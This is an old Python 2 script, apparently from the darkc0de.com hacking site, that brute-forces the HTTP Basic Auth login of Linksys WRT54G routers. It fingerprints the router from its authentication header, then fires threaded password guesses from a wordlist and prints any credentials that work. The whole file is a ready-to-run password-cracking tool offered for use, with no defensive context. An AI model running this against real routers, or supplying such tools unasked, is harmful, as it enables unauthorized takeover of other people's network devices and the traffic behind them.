#!usr/bin/python
#Linksys WRT54G router brute force
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, urllib2, socket

if len(sys.argv) !=4:
	print "Usage: ./linksysbrute.py <server> <user> <wordlist>"
	sys.exit(1)

try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

username = sys.argv[2]

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	lock.release()
	return value[0][:-1] 

def getauth(url):
	
	req = urllib2.Request(url)
	try:
    		handle = urllib2.urlopen(req)
	except IOError, e:                  
    		pass
	authline = e.headers.get('www-authenticate', '')
	server = e.headers.get('server', '')
	return authline, server
			
class Worker(threading.Thread):
	
	def run(self):
		password = getword()
		try:
			print "-"*12
			print "User:",username,"Password:",password
			req = urllib2.Request(sys.argv[1])
			passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
			passman.add_password(None, sys.argv[1], username, password)
			authhandler = urllib2.HTTPBasicAuthHandler(passman)
			opener = urllib2.build_opener(authhandler)
			fd = opener.open(req)
			print "\t\n\n[+] Login successful: Username:",username,"Password:",password,"\n"			
			print "[+] Retrieved", fd.geturl()
			info = fd.info()
			for key, value in info.items():
    				print "%s = %s" % (key, value)
			sys.exit(2)
		except (urllib2.HTTPError,socket.error):
			pass

print "\n\t   d3hydr8[at]gmail[dot]com LinksysBrute v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] User:",username
print "[+] Words Loaded:",len(words)
try:
	auth, server = getauth(sys.argv[1])
except(AttributeError):
	print "\n[-] Connection Failure\n"
	sys.exit(1)
if auth.find("WRT54G") == -1:
	print "[-] WRT54G Router not found"
print "[+] Server:",server
print "[+]",auth,"\n"

for i in range(len(words)):
	work = Worker()
	work.setDaemon(1)
	work.start()
	time.sleep(1)
